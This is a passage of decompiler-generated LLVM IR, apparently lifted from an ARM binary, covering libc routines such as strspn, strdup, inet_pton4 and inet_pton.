  %v0_18dbc = load i32, i32* @r1, align 4
  %v1_18dbc = add i32 %v0_18dbc, 1
  store i32 %v1_18dbc, i32* @r1, align 4
  %v0_18dc0.pr.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18dc0thread-pre-split

dec_label_pc_18dc0thread-pre-split:               ; preds = %dec_label_pc_18dbc, %dec_label_pc_18d28
  %v2_18db46 = phi i32 [ %v6_18db4, %dec_label_pc_18dbc ], [ %v1_18d2c, %dec_label_pc_18d28 ]
  %v0_18dc0.pr = phi i32 [ %v0_18dc0.pr.pre, %dec_label_pc_18dbc ], [ %v0_18d28, %dec_label_pc_18d28 ]
  br label %dec_label_pc_18dc0

dec_label_pc_18dc0:                               ; preds = %dec_label_pc_18dc0thread-pre-split, %dec_label_pc_18da0
  %v3_18dcc = phi i32 [ %v2_18db46, %dec_label_pc_18dc0thread-pre-split ], [ %v1_18d90, %dec_label_pc_18da0 ]
  %v1_18dcc = phi i32 [ %v0_18dc0.pr, %dec_label_pc_18dc0thread-pre-split ], [ %v1_18da0, %dec_label_pc_18da0 ]
  %v2_18dc0 = icmp eq i32 %v1_18dcc, 0
  store i1 %v2_18dc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18dc0, label %dec_label_pc_18dc8, label %dec_label_pc_18da8

dec_label_pc_18dc8:                               ; preds = %dec_label_pc_18dc0
  %v0_18dc8 = load i32, i32* %ip.global-to-local, align 4
  %v2_18dc8 = icmp eq i32 %v0_18dc8, 0
  store i1 %v2_18dc8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18dc8, label %.loopexit, label %bb

bb:                                               ; preds = %dec_label_pc_18dc8
  %v4_18dcc = add i32 %v3_18dcc, 1
  %v5_18dcc = inttoptr i32 %v4_18dcc to i8*
  store i8 0, i8* %v5_18dcc, align 1
  br label %.loopexit

.loopexit:                                        ; preds = %dec_label_pc_18d7c, %dec_label_pc_18d64, %dec_label_pc_18d4c, %dec_label_pc_18d38, %dec_label_pc_18da8, %dec_label_pc_18dc8, %bb
  %v0_18dd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_18dd0, i32* %r0.global-to-local, align 4
  %v2_18dd4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18dd4, i32* @r4, align 4
  ret i32 %v0_18dd0

; uselistorder directives
  uselistorder i32 %v1_18dcc, { 1, 0 }
  uselistorder i32 %v1_18da0, { 1, 0 }
  uselistorder i32 %v0_18d98, { 1, 0 }
  uselistorder i32 %v1_18d90, { 0, 2, 1 }
  uselistorder i32 %v1_18d8c, { 1, 0 }
  uselistorder i32 %v0_18d28, { 2, 1, 0, 3 }
  uselistorder i32 %v5_18d1c, { 1, 0 }
  uselistorder i32 %v0_18d1c, { 0, 2, 1 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 4, 1, 2, 3, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 6, 0, 1, 2, 3, 4, 5, 7 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 3, 1, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14 }
  uselistorder label %.loopexit, { 6, 5, 4, 0, 1, 2, 3 }
}

define i32 @__GI_strspn(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* @lr, align 4
  %v0_18e102 = load i32, i32* @r0, align 4
  %v1_18e103 = inttoptr i32 %v0_18e102 to i8*
  %v2_18e104 = load i8, i8* %v1_18e103, align 1
  %v2_18e146 = icmp eq i8 %v2_18e104, 0
  br i1 %v2_18e146, label %dec_label_pc_18e20, label %dec_label_pc_18dec.preheader

dec_label_pc_18de4:                               ; preds = %dec_label_pc_18dec
  %v1_18df4 = add i32 %v0_18df4, 1
  %v9_18de4 = icmp eq i8 %v0_18e00.in, %v2_18dec
  br i1 %v9_18de4, label %dec_label_pc_18e00, label %dec_label_pc_18dec

dec_label_pc_18dec:                               ; preds = %dec_label_pc_18dec.preheader, %dec_label_pc_18de4
  %v0_18df4 = phi i32 [ %tmp, %dec_label_pc_18dec.preheader ], [ %v1_18df4, %dec_label_pc_18de4 ]
  %v1_18dec = inttoptr i32 %v0_18df4 to i8*
  %v2_18dec = load i8, i8* %v1_18dec, align 1
  %v3_18dec = zext i8 %v2_18dec to i32
  store i32 %v3_18dec, i32* @ip, align 4
  %v2_18df0 = icmp eq i8 %v2_18dec, 0
  br i1 %v2_18df0, label %dec_label_pc_18e20, label %dec_label_pc_18de4

dec_label_pc_18e00:                               ; preds = %dec_label_pc_18de4
  %v2_18e00 = icmp eq i8 %v0_18e00.in, 0
  br i1 %v2_18e00, label %dec_label_pc_18e20, label %dec_label_pc_18e08

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18e00
  %v1_18e08 = add i32 %v0_18e08, 1
  store i32 %v1_18e08, i32* @lr, align 4
  %v1_18e0c = add i32 %v0_18e0c, 1
  %v1_18e10 = inttoptr i32 %v1_18e0c to i8*
  %v2_18e10 = load i8, i8* %v1_18e10, align 1
  %v2_18e14 = icmp eq i8 %v2_18e10, 0
  br i1 %v2_18e14, label %dec_label_pc_18e20, label %dec_label_pc_18dec.preheader

dec_label_pc_18dec.preheader:                     ; preds = %entry, %dec_label_pc_18e08
  %v0_18e0c = phi i32 [ %v1_18e0c, %dec_label_pc_18e08 ], [ %v0_18e102, %entry ]
  %v0_18e08 = phi i32 [ %v1_18e08, %dec_label_pc_18e08 ], [ 0, %entry ]
  %v0_18e00.in = phi i8 [ %v2_18e10, %dec_label_pc_18e08 ], [ %v2_18e104, %entry ]
  br label %dec_label_pc_18dec

dec_label_pc_18e20:                               ; preds = %dec_label_pc_18e00, %dec_label_pc_18e08, %dec_label_pc_18dec, %entry
  %v0_18e20 = phi i32 [ 0, %entry ], [ %v0_18e08, %dec_label_pc_18dec ], [ %v1_18e08, %dec_label_pc_18e08 ], [ %v0_18e08, %dec_label_pc_18e00 ]
  ret i32 %v0_18e20

; uselistorder directives
  uselistorder i8 %v0_18e00.in, { 1, 0 }
  uselistorder i8 %v2_18dec, { 1, 2, 0 }
  uselistorder i32 %v0_18df4, { 1, 0 }
  uselistorder label %dec_label_pc_18e20, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_18dec.preheader, { 1, 0 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_18e28 = load i32, i32* @r4, align 4
  store i32 %v3_18e28, i32* %stack_var_-12, align 4
  %v6_18e28 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r5, align 4
  %v3_18e30 = call i32 @strlen(i8* %arg1)
  %v1_18e34 = add i32 %v3_18e30, 1
  store i32 %v1_18e34, i32* @r4, align 4
  %v1_18e3c = call i32 @malloc(i32 %v1_18e34)
  store i32 101968, i32* @lr, align 4
  %v1_18e4c = icmp ne i32 %v1_18e3c, 0
  call void @__pseudo_cond_branch(i1 %v1_18e4c, i32 ptrtoint (i32* @global_var_13e10.1249 to i32))
  %v2_18e54 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18e54, i32* @r4, align 4
  store i32 %v6_18e28, i32* @r5, align 4
  ret i32 %v1_18e3c

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 9, 6, 5, 3, 15, 8, 7, 14, 13, 12, 11, 10, 4, 2, 1, 0 }
}

define i32 @inet_pton4(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v6_18e58 = load i32, i32* @r5, align 4
  %v2_18e60 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg2, i32* @r5, align 4
  store i32 0, i32* @lr, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v2_18e60, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-16, align 4
  %v2_18ee83 = load i8, i8* %arg1, align 1
  %v3_18ee84 = zext i8 %v2_18ee83 to i32
  %v5_18ee85 = add i32 %tmp, 1
  store i32 %v5_18ee85, i32* @r4, align 4
  %v2_18eec6 = icmp eq i8 %v2_18ee83, 0
  store i1 %v2_18eec6, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18eec6, label %dec_label_pc_18ef8, label %dec_label_pc_18e80

dec_label_pc_18e80:                               ; preds = %entry, %dec_label_pc_18ee8.backedge
  %v0_18ec4 = phi i32 [ %v3_18ee8, %dec_label_pc_18ee8.backedge ], [ %v3_18ee84, %entry ]
  %v1_18ef010.in = phi i32 [ %v3_18ee8, %dec_label_pc_18ee8.backedge ], [ %v3_18ee84, %entry ]
  %v1_18ef010 = add nsw i32 %v1_18ef010.in, -48
  %v2_18e80 = icmp ugt i32 %v1_18ef010, 8
  %v7_18e80 = icmp eq i32 %v1_18ef010, 9
  store i1 %v7_18e80, i1* %cpsr_z.global-to-local, align 1
  %v2_18e88 = xor i1 %v7_18e80, true
  %v3_18e88 = and i1 %v2_18e80, %v2_18e88
  br i1 %v3_18e88, label %dec_label_pc_18ec4, label %dec_label_pc_18e8c

dec_label_pc_18e8c:                               ; preds = %dec_label_pc_18e80
  %v0_18e8c = load i32, i32* %r0.global-to-local, align 4
  %v1_18e8c = inttoptr i32 %v0_18e8c to i8*
  %v2_18e8c = load i8, i8* %v1_18e8c, align 1
  %v3_18e8c = zext i8 %v2_18e8c to i32
  %v3_18e94 = mul nuw nsw i32 %v3_18e8c, 10
  %v4_18e94 = add nuw nsw i32 %v3_18e94, %v0_18ec4
  %v1_18e98 = add nsw i32 %v4_18e94, -48
  %v2_18e9c = icmp ugt i32 %v1_18e98, 254
  %v7_18e9c = icmp eq i32 %v1_18e98, 255
  store i1 %v7_18e9c, i1* %cpsr_z.global-to-local, align 1
  %v2_18ea0 = xor i1 %v7_18e9c, true
  %v3_18ea0 = and i1 %v2_18e9c, %v2_18ea0
  br i1 %v3_18ea0, label %dec_label_pc_18f1c, label %dec_label_pc_18ea4

dec_label_pc_18ea4:                               ; preds = %dec_label_pc_18e8c
  %v0_18ea4 = load i32, i32* %r1.global-to-local, align 4
  %v2_18ea4 = icmp eq i32 %v0_18ea4, 0
  store i1 %v2_18ea4, i1* %cpsr_z.global-to-local, align 1
  %v1_18ea8 = trunc i32 %v1_18e98 to i8
  store i8 %v1_18ea8, i8* %v1_18e8c, align 1
  %v0_18eac = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_18eac, label %dec_label_pc_18eb0, label %dec_label_pc_18ee8.backedge

dec_label_pc_18eb0:                               ; preds = %dec_label_pc_18ea4
  %v0_18eb0 = load i32, i32* @lr, align 4
  %v1_18eb0 = add i32 %v0_18eb0, 1
  store i32 %v1_18eb0, i32* @lr, align 4
  %v7_18eb4 = icmp eq i32 %v1_18eb0, 4
  store i1 %v7_18eb4, i1* %cpsr_z.global-to-local, align 1
  %v0_18eb8 = load i32, i32* %r1.global-to-local, align 4
  %v1_18eb8 = add i32 %v0_18eb8, 1
  store i32 %v1_18eb8, i32* %r1.global-to-local, align 4
  %v8_18ebc = icmp sgt i32 %v1_18eb0, 4
  br i1 %v8_18ebc, label %dec_label_pc_18f1c, label %dec_label_pc_18ee8.backedge

dec_label_pc_18ec4:                               ; preds = %dec_label_pc_18e80
  %v7_18ec4 = icmp eq i32 %v0_18ec4, 46
  store i1 %v7_18ec4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18ec4, label %bb, label %.thread12

.thread12:                                        ; preds = %dec_label_pc_18ec4
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18f1c

bb:                                               ; preds = %dec_label_pc_18ec4
  %v1_18ecc = load i32, i32* %r1.global-to-local, align 4
  %v2_18ecc = urem i32 %v1_18ecc, 2
  %v2_18ed0 = icmp eq i32 %v2_18ecc, 0
  store i1 %v2_18ed0, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r1.global-to-local, align 4
  br i1 %v2_18ed0, label %dec_label_pc_18f1c, label %dec_label_pc_18edc

dec_label_pc_18edc:                               ; preds = %bb
  %v0_18edc = load i32, i32* @lr, align 4
  %v7_18edc = icmp eq i32 %v0_18edc, 4
  store i1 %v7_18edc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18edc, label %dec_label_pc_18f1c, label %dec_label_pc_18ee4

dec_label_pc_18ee4:                               ; preds = %dec_label_pc_18edc
  %v2_18ee4 = load i32, i32* %r0.global-to-local, align 4
  %v3_18ee4 = add i32 %v2_18ee4, 1
  %v4_18ee4 = inttoptr i32 %v3_18ee4 to i8*
  store i8 0, i8* %v4_18ee4, align 1
  %v5_18ee4 = load i32, i32* %r0.global-to-local, align 4
  %v6_18ee4 = add i32 %v5_18ee4, 1
  store i32 %v6_18ee4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_18ee8.backedge

dec_label_pc_18ee8.backedge:                      ; preds = %dec_label_pc_18ee4, %dec_label_pc_18ea4, %dec_label_pc_18eb0
  %v0_18ee8 = load i32, i32* @r4, align 4
  %v1_18ee8 = inttoptr i32 %v0_18ee8 to i8*
  %v2_18ee8 = load i8, i8* %v1_18ee8, align 1
  %v3_18ee8 = zext i8 %v2_18ee8 to i32
  %v5_18ee8 = add i32 %v0_18ee8, 1
  store i32 %v5_18ee8, i32* @r4, align 4
  %v2_18eec = icmp eq i8 %v2_18ee8, 0
  store i1 %v2_18eec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18eec, label %dec_label_pc_18ee8.dec_label_pc_18ef8_crit_edge, label %dec_label_pc_18e80

dec_label_pc_18ee8.dec_label_pc_18ef8_crit_edge:  ; preds = %dec_label_pc_18ee8.backedge
  %v0_18ef8.pre = load i32, i32* @lr, align 4
  br label %dec_label_pc_18ef8

dec_label_pc_18ef8:                               ; preds = %dec_label_pc_18ee8.dec_label_pc_18ef8_crit_edge, %entry
  %v0_18ef8 = phi i32 [ %v0_18ef8.pre, %dec_label_pc_18ee8.dec_label_pc_18ef8_crit_edge ], [ 0, %entry ]
  %v7_18ef8 = icmp eq i32 %v0_18ef8, 3
  store i1 %v7_18ef8, i1* %cpsr_z.global-to-local, align 1
  %v7_18efc = icmp slt i32 %v0_18ef8, 4
  br i1 %v7_18efc, label %dec_label_pc_18f1c, label %dec_label_pc_18f00

dec_label_pc_18f00:                               ; preds = %dec_label_pc_18ef8
  %v0_18f00 = load i32, i32* @r5, align 4
  store i32 %v0_18f00, i32* @r0, align 4
  store i32 %v2_18e60, i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_18f0c = call i32 @memcpy()
  br label %dec_label_pc_18f1c

dec_label_pc_18f1c:                               ; preds = %dec_label_pc_18e8c, %dec_label_pc_18eb0, %bb, %dec_label_pc_18edc, %.thread12, %dec_label_pc_18ef8, %dec_label_pc_18f00
  %storemerge = phi i32 [ 1, %dec_label_pc_18f00 ], [ 0, %dec_label_pc_18ef8 ], [ 0, %.thread12 ], [ 0, %dec_label_pc_18edc ], [ 0, %bb ], [ 0, %dec_label_pc_18eb0 ], [ 0, %dec_label_pc_18e8c ]
  store i32 %storemerge, i32* %r0.global-to-local, align 4
  store i32 %v6_18e58, i32* @r5, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_18ef8, { 1, 0 }
  uselistorder i32 %v3_18ee8, { 1, 0 }
  uselistorder i32 %v0_18ec4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 4, 1, 3, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 2, 11, 3, 4, 1, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder label %dec_label_pc_18f1c, { 6, 5, 3, 2, 4, 1, 0 }
  uselistorder label %dec_label_pc_18ee8.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18e80, { 1, 0 }
}

define i32 @inet_pton(i32 %arg1, i8* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %v3_18f24 = load i32, i32* @r4, align 4
  %v6_18f24 = load i32, i32* @r5, align 4
  %v9_18f24 = load i32, i32* @r6, align 4
  %v7_18f28 = icmp eq i32 %arg1, 2
  store i32 %tmp, i32* @r6, align 4
  store i32 %arg3, i32* %stack_var_-60, align 4
  br i1 %v7_18f28, label %dec_label_pc_18f48, label %dec_label_pc_18f3c

dec_label_pc_18f3c:                               ; preds = %entry
  %v7_18f3c = icmp eq i32 %arg1, 10
  br i1 %v7_18f3c, label %dec_label_pc_18f5c, label %dec_label_pc_1910c

dec_label_pc_18f48:                               ; preds = %entry
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v4_18f50 = call i32 @inet_pton4(i8* %arg2, i32 %arg3)
  store i32 %v4_18f50, i32* %r0.global-to-local, align 4
  store i32 %v4_18f50, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_19124

dec_label_pc_18f5c:                               ; preds = %dec_label_pc_18f3c
  %v2_18f5c = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_18f5c, i32* %r0.global-to-local, align 4
  store i32 16, i32* @r2, align 4
  %v2_18f68 = bitcast i32* %stack_var_-52 to i8*
  %v3_18f68 = call i32 @__GI_memset(i8* %v2_18f68, i32 0)
  store i32 %v3_18f68, i32* %r0.global-to-local, align 4
  %v0_18f6c = load i32, i32* @r6, align 4
  %v1_18f6c = inttoptr i32 %v0_18f6c to i8*
  %v2_18f6c = load i8, i8* %v1_18f6c, align 1
  %v3_18f6c = zext i8 %v2_18f6c to i32
  store i32 %v3_18f6c, i32* %r3.global-to-local, align 4
  %v7_18f70 = icmp eq i8 %v2_18f6c, 58
  store i32 %v3_18f68, i32* @r4, align 4
  %v2_18f78 = add i32 %v3_18f68, 16
  store i32 %v2_18f78, i32* %r8.global-to-local, align 4
  br i1 %v7_18f70, label %dec_label_pc_18f80, label %dec_label_pc_18f8c

dec_label_pc_18f80:                               ; preds = %dec_label_pc_18f5c
  %v1_18f80 = add i32 %v0_18f6c, 1
  %v2_18f80 = inttoptr i32 %v1_18f80 to i8*
  %v3_18f80 = load i8, i8* %v2_18f80, align 1
  %v4_18f80 = zext i8 %v3_18f80 to i32
  store i32 %v4_18f80, i32* %r3.global-to-local, align 4
  store i32 %v1_18f80, i32* @r6, align 4
  %v7_18f84 = icmp eq i8 %v3_18f80, 58
  br i1 %v7_18f84, label %dec_label_pc_18f8c, label %dec_label_pc_19120

dec_label_pc_18f8c:                               ; preds = %dec_label_pc_18f80, %dec_label_pc_18f5c
  %v0_18f90 = phi i32 [ %v1_18f80, %dec_label_pc_18f80 ], [ %v0_18f6c, %dec_label_pc_18f5c ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_18f90, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1906c7 = inttoptr i32 %v0_18f90 to i8*
  %v2_1906c8 = load i8, i8* %v1_1906c7, align 1
  %v3_1906c9 = zext i8 %v2_1906c8 to i32
  store i32 %v3_1906c9, i32* %r0.global-to-local, align 4
  %v1_1907010 = call i32 @__GI_tolower(i32 %v3_1906c9)
  store i32 %v1_1907010, i32* %r0.global-to-local, align 4
  store i32 %v1_1907010, i32* @r5, align 4
  %v2_1907412 = icmp eq i32 %v1_1907010, 0
  br i1 %v2_1907412, label %dec_label_pc_1907c, label %dec_label_pc_18fa0

dec_label_pc_18fa0:                               ; preds = %dec_label_pc_18f8c, %dec_label_pc_1906c.backedge
  %v0_18fa4 = phi i32 [ %v1_19070, %dec_label_pc_1906c.backedge ], [ %v1_1907010, %dec_label_pc_18f8c ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1906c.backedge ], [ 0, %dec_label_pc_18f8c ]
  store i32 ptrtoint ([17 x i8]* @global_var_24ef8.1347 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_24ef8.1347 to i32), i32* %r0.global-to-local, align 4
  %v3_18fac = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_24ef8.1347 to i32), i32 %v0_18fa4)
  %v4_18fac = trunc i32 %v3_18fac to i8
  store i32 %v3_18fac, i32* %r0.global-to-local, align 4
  %v3_18fb0 = icmp eq i8 %v4_18fac, 0
  %v0_18fb4 = load i32, i32* @r6, align 4
  %v1_18fb4 = add i32 %v0_18fb4, 1
  store i32 %v1_18fb4, i32* @r6, align 4
  br i1 %v3_18fb0, label %dec_label_pc_18fd0, label %dec_label_pc_18fbc

dec_label_pc_18fbc:                               ; preds = %dec_label_pc_18fa0
  %v0_18fbc = load i32, i32* %sb.global-to-local, align 4
  %v2_18fbc = sext i8 %v4_18fac to i32
  %v3_18fbc = sub i32 %v2_18fbc, %v0_18fbc
  store i32 %v3_18fbc, i32* %r3.global-to-local, align 4
  %v1_18fc0 = load i32, i32* %r7.global-to-local, align 4
  %v4_18fc0 = mul i32 %v1_18fc0, 16
  %v5_18fc0 = or i32 %v4_18fc0, %v3_18fbc
  store i32 %v5_18fc0, i32* %r7.global-to-local, align 4
  %v3_18fc8 = icmp ult i32 %v5_18fc0, 65534
  br i1 %v3_18fc8, label %dec_label_pc_19064, label %dec_label_pc_19120

dec_label_pc_18fd0:                               ; preds = %dec_label_pc_18fa0
  %v0_18fd0 = load i32, i32* @r5, align 4
  %v7_18fd0 = icmp eq i32 %v0_18fd0, 58
  br i1 %v7_18fd0, label %dec_label_pc_18fd8, label %dec_label_pc_19034

dec_label_pc_18fd8:                               ; preds = %dec_label_pc_18fd0
  %v4_18fd82 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_18fd82, i32* %r3.global-to-local, align 4
  %v2_18fdc = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_18fdc, label %dec_label_pc_18fe4, label %dec_label_pc_18ff8

dec_label_pc_18fe4:                               ; preds = %dec_label_pc_18fd8
  %v0_18fe4 = load i32, i32* %fp.global-to-local, align 4
  %v2_18fe4 = icmp eq i32 %v0_18fe4, 0
  br i1 %v2_18fe4, label %dec_label_pc_18fec, label %dec_label_pc_19120

dec_label_pc_18fec:                               ; preds = %dec_label_pc_18fe4
  %v0_18fec = load i32, i32* @r4, align 4
  store i32 %v0_18fec, i32* %fp.global-to-local, align 4
  store i32 %v1_18fb4, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1906c.backedge

dec_label_pc_18ff8:                               ; preds = %dec_label_pc_18fd8
  %v1_18ff8 = inttoptr i32 %v1_18fb4 to i8*
  %v2_18ff8 = load i8, i8* %v1_18ff8, align 1
  %v3_18ff8 = zext i8 %v2_18ff8 to i32
  store i32 %v3_18ff8, i32* %r3.global-to-local, align 4
  %v2_18ffc = icmp eq i8 %v2_18ff8, 0
  br i1 %v2_18ffc, label %dec_label_pc_19120, label %dec_label_pc_19004

dec_label_pc_19004:                               ; preds = %dec_label_pc_18ff8
  %v0_19004 = load i32, i32* @r4, align 4
  %v1_19004 = add i32 %v0_19004, 2
  store i32 %v1_19004, i32* %r3.global-to-local, align 4
  %v1_19008 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_19004, %v1_19008
  br i1 %tmp38, label %dec_label_pc_19120, label %dec_label_pc_19010

dec_label_pc_19010:                               ; preds = %dec_label_pc_19004
  %v0_19010 = load i32, i32* %r7.global-to-local, align 4
  %v3_19010 = udiv i32 %v0_19010, 256
  store i32 %v3_19010, i32* %r2.global-to-local, align 4
  store i32 %v0_19004, i32* %r3.global-to-local, align 4
  %v1_19018 = trunc i32 %v3_19010 to i8
  %v3_19018 = inttoptr i32 %v0_19004 to i8*
  store i8 %v1_19018, i8* %v3_19018, align 1
  %v4_19018 = load i32, i32* %r3.global-to-local, align 4
  %v5_19018 = add i32 %v4_19018, 1
  store i32 %v5_19018, i32* %r3.global-to-local, align 4
  %v0_1901c = load i32, i32* @r6, align 4
  store i32 %v0_1901c, i32* %sl.global-to-local, align 4
  %v0_19020 = load i32, i32* %r7.global-to-local, align 4
  %v1_19020 = trunc i32 %v0_19020 to i8
  %v2_19020 = load i32, i32* @r4, align 4
  %v3_19020 = add i32 %v2_19020, 1
  %v4_19020 = inttoptr i32 %v3_19020 to i8*
  store i8 %v1_19020, i8* %v4_19020, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_19028 = load i32, i32* %r3.global-to-local, align 4
  %v1_19028 = add i32 %v0_19028, 1
  store i32 %v1_19028, i32* @r4, align 4
  %v0_1906c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1906c.backedge

dec_label_pc_19034:                               ; preds = %dec_label_pc_18fd0
  %v7_19034 = icmp eq i32 %v0_18fd0, 46
  br i1 %v7_19034, label %dec_label_pc_1903c, label %dec_label_pc_19120

dec_label_pc_1903c:                               ; preds = %dec_label_pc_19034
  %v0_1903c = load i32, i32* @r4, align 4
  %v1_1903c = add i32 %v0_1903c, 4
  store i32 %v1_1903c, i32* @r5, align 4
  %v1_19040 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1903c, %v1_19040
  br i1 %tmp39, label %dec_label_pc_19120, label %dec_label_pc_19048

dec_label_pc_19048:                               ; preds = %dec_label_pc_1903c
  %v0_1904c = load i32, i32* %sl.global-to-local, align 4
  %v1_1904c = inttoptr i32 %v0_1904c to i8*
  store i32 %v0_1904c, i32* %r0.global-to-local, align 4
  %v4_19050 = call i32 @inet_pton4(i8* %v1_1904c, i32 %v0_1903c)
  store i32 %v4_19050, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_19050, 1
  br i1 %tmp36, label %dec_label_pc_19120, label %bb

bb:                                               ; preds = %dec_label_pc_19048
  %v5_19058 = load i32, i32* @r5, align 4
  store i32 %v5_19058, i32* @r4, align 4
  br label %dec_label_pc_190a8

dec_label_pc_19064:                               ; preds = %dec_label_pc_18fbc
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1906c.backedge

dec_label_pc_1906c.backedge:                      ; preds = %dec_label_pc_19064, %dec_label_pc_18fec, %dec_label_pc_19010
  %v0_1906c = phi i32 [ %v1_18fb4, %dec_label_pc_18fec ], [ %v0_1906c.pre, %dec_label_pc_19010 ], [ %v1_18fb4, %dec_label_pc_19064 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_18fec ], [ 0, %dec_label_pc_19010 ], [ 1, %dec_label_pc_19064 ]
  %v1_1906c = inttoptr i32 %v0_1906c to i8*
  %v2_1906c = load i8, i8* %v1_1906c, align 1
  %v3_1906c = zext i8 %v2_1906c to i32
  store i32 %v3_1906c, i32* %r0.global-to-local, align 4
  %v1_19070 = call i32 @__GI_tolower(i32 %v3_1906c)
  store i32 %v1_19070, i32* %r0.global-to-local, align 4
  store i32 %v1_19070, i32* @r5, align 4
  %v2_19074 = icmp eq i32 %v1_19070, 0
  br i1 %v2_19074, label %dec_label_pc_1907c, label %dec_label_pc_18fa0

dec_label_pc_1907c:                               ; preds = %dec_label_pc_1906c.backedge, %dec_label_pc_18f8c
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_18f8c ], [ %stack_var_-56.0.be, %dec_label_pc_1906c.backedge ]
  %v4_1907c3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1907c3, i32* %r3.global-to-local, align 4
  %v2_19080 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_190ec.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_19080, label %dec_label_pc_190a8, label %dec_label_pc_19088

dec_label_pc_19088:                               ; preds = %dec_label_pc_1907c
  %v1_19088 = add i32 %v0_190ec.pre.pre, 2
  store i32 %v1_19088, i32* %r3.global-to-local, align 4
  %v1_1908c = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_19088, %v1_1908c
  br i1 %tmp40, label %dec_label_pc_19120, label %dec_label_pc_19094

dec_label_pc_19094:                               ; preds = %dec_label_pc_19088
  store i32 %v0_190ec.pre.pre, i32* %r3.global-to-local, align 4
  %v0_19098 = load i32, i32* %r7.global-to-local, align 4
  %v3_19098 = udiv i32 %v0_19098, 256
  store i32 %v3_19098, i32* %r2.global-to-local, align 4
  %v1_1909c = trunc i32 %v3_19098 to i8
  %v3_1909c = inttoptr i32 %v0_190ec.pre.pre to i8*
  store i8 %v1_1909c, i8* %v3_1909c, align 1
  %v4_1909c = load i32, i32* %r3.global-to-local, align 4
  %v5_1909c = add i32 %v4_1909c, 1
  store i32 %v5_1909c, i32* %r3.global-to-local, align 4
